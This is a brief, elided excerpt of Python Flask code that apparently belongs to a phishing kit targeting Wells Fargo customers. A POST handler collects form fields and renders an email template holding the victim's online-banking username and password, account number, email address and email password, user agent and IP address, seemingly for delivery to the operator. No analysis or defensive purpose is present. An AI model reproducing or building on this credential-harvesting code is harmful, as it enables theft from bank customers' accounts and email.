...
def first():
    if request.method == 'POST':
        ...
        accountnum = request.form.get("achorse")
        ...
        """
        html = render_template('emailmailer.html', wellsonline=wellson, wellspassword=wellspass, accountnumber=accountnum, emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
